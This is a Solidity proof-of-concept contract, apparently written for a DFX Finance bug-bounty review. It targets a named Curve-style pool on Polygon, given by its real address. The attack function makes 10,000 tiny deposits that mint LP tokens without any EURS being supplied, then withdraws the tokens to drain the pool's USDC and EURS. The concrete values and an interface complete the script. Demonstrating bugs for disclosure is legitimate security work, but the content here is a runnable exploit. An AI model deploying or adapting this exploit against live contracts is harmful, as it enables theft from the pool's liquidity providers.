// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../src/tokens/Tokens.sol";
import "../src/PoC.sol";

contract DFXFinanceBugfixReview is PoC {
    ICurve constant curve_pool = ICurve(0x2385D7aB31F5a470B1723675846cb074988531da);
    IERC20 constant EURS = IERC20(0xE111178A87A3BFf0c8d18DECBa5798827539Ae99);

    IERC20[] tokens;

    function initiateAttack() external {
        tokens.push(PolygonTokens.USDC);
        tokens.push(EURS);

        // snapshotAndPrint(address(curve_pool), tokens);
        setAlias(address(curve_pool), "curve_pool");
        setAlias(address(this), "Attacker");

        // Execute attack multiple times to drain pool
        _executeAttack();
    }

    function _executeAttack() internal {
        console.log("\n>>> Execute attack");

        // Approve curve pool to use funds
        PolygonTokens.USDC.approve(address(curve_pool), PolygonTokens.USDC.balanceOf(address(this)));
        // EURS approval is not needed since calculated amount to deposit is 0
        // EURS.approve(address(curve_pool), EURS.balanceOf(address(this)));

        uint256 deposit = 18003307228925150;
        uint256 minQuoteAmount = 0;
        uint256 minBaseAmount = 0;
        uint256 maxQuoteAmount = 2852783032400000000000;
        uint256 maxBaseAmount = 7992005633260983540235600000000;
        uint256 deadline = 1676706352308;

        // Deposit small amount in a loop 10,000 times to gain curve LP tokens without depositing EURS
        // If gas price is 231 wei = 0.000000231651787155 => Gas = 161 matic
        console.log("Deposit small amount to curve pool 10,000 times");
        for (uint256 i = 0; i < 10000; i++) {
            curve_pool.deposit(deposit, minQuoteAmount, minBaseAmount, maxQuoteAmount, maxBaseAmount, deadline);
        }

        snapshotAndPrint(address(this), tokens);

        console.log("Withdraw curve pool LP tokens");

        IERC20[] memory curve_token = new IERC20[](1);
        curve_token[0] = IERC20(address(curve_pool));
        snapshotAndPrint(address(this), curve_token);

        // Withdraw curve LP tokens to receive proportion of liquidity in pool of EURS and USDC
        uint256 curvesToBurn = curve_pool.balanceOf(address(this));
        curve_pool.withdraw(curvesToBurn, deadline);

        _completeAttack();
    }

    function _completeAttack() internal {
        console.log("\n>>> Complete attack");
    }
}

interface ICurve {
    event Approval(address indexed _owner, address indexed spender, uint256 value);
    event AssetIncluded(address indexed numeraire, address indexed reserve, uint256 weight);
    event AssimilatorIncluded(
        address indexed derivative, address indexed numeraire, address indexed reserve, address assimilator
    );
    event EmergencyAlarm(bool isEmergency);
    event Flash(address indexed from, address indexed to, uint256 value0, uint256 value1, uint256 paid0, uint256 paid1);
    event FrozenSet(bool isFrozen);
    event OwnershipTransfered(address indexed previousOwner, address indexed newOwner);
    event ParametersSet(uint256 alpha, uint256 beta, uint256 delta, uint256 epsilon, uint256 lambda);
    event PartitionRedeemed(address indexed token, address indexed redeemer, uint256 value);
    event Trade(
        address indexed trader,
        address indexed origin,
        address indexed target,
        uint256 originAmount,
        uint256 targetAmount,
        int128 rawProtocolFee
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function allowance(address _owner, address _spender) external view returns (uint256 allowance_);
    function approve(address _spender, uint256 _amount) external returns (bool success_);
    function assimilator(address _derivative) external view returns (address assimilator_);
    function balanceOf(address _account) external view returns (uint256 balance_);
    function curve()
        external
        view
        returns (int128 alpha, int128 beta, int128 delta, int128 epsilon, int128 lambda, uint256 totalSupply);
    function decimals() external view returns (uint8);
    function deposit(
        uint256 _deposit,
        uint256 _minQuoteAmount,
        uint256 _minBaseAmount,
        uint256 _maxQuoteAmount,
        uint256 _maxBaseAmount,
        uint256 _deadline
    ) external returns (uint256, uint256[] memory);
    function derivatives(uint256) external view returns (address);
    function emergency() external view returns (bool);
    function emergencyWithdraw(uint256 _curvesToBurn, uint256 _deadline)
        external
        returns (uint256[] memory withdrawals_);
    function excludeDerivative(address _derivative) external;
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes memory data) external;
    function frozen() external view returns (bool);
    function liquidity() external view returns (uint256 total_, uint256[] memory individual_);
    function name() external view returns (string memory);
    function numeraires(uint256) external view returns (address);
    function originSwap(
        address _origin,
        address _target,
        uint256 _originAmount,
        uint256 _minTargetAmount,
        uint256 _deadline
    ) external returns (uint256 targetAmount_);
    function owner() external view returns (address);
    function reserves(uint256) external view returns (address);
    function setAssimilator(address _baseCurrency, address _baseAssim, address _quoteCurrency, address _quoteAssim)
        external;
    function setEmergency(bool _emergency) external;
    function setFrozen(bool _toFreezeOrNotToFreeze) external;
    function setParams(uint256 _alpha, uint256 _beta, uint256 _feeAtHalt, uint256 _epsilon, uint256 _lambda) external;
    function supportsInterface(bytes4 _interface) external pure returns (bool supports_);
    function symbol() external view returns (string memory);
    function targetSwap(
        address _origin,
        address _target,
        uint256 _maxOriginAmount,
        uint256 _targetAmount,
        uint256 _deadline
    ) external returns (uint256 originAmount_);
    function totalSupply() external view returns (uint256 totalSupply_);
    function transfer(address _recipient, uint256 _amount) external returns (bool success_);
    function transferFrom(address _sender, address _recipient, uint256 _amount) external returns (bool success_);
    function transferOwnership(address _newOwner) external;
    function viewCurve()
        external
        view
        returns (uint256 alpha_, uint256 beta_, uint256 delta_, uint256 epsilon_, uint256 lambda_);
    function viewDeposit(uint256 _deposit) external view returns (uint256, uint256[] memory);
    function viewOriginSwap(address _origin, address _target, uint256 _originAmount)
        external
        view
        returns (uint256 targetAmount_);
    function viewTargetSwap(address _origin, address _target, uint256 _targetAmount)
        external
        view
        returns (uint256 originAmount_);
    function viewWithdraw(uint256 _curvesToBurn) external view returns (uint256[] memory);
    function withdraw(uint256 _curvesToBurn, uint256 _deadline) external returns (uint256[] memory withdrawals_);
}
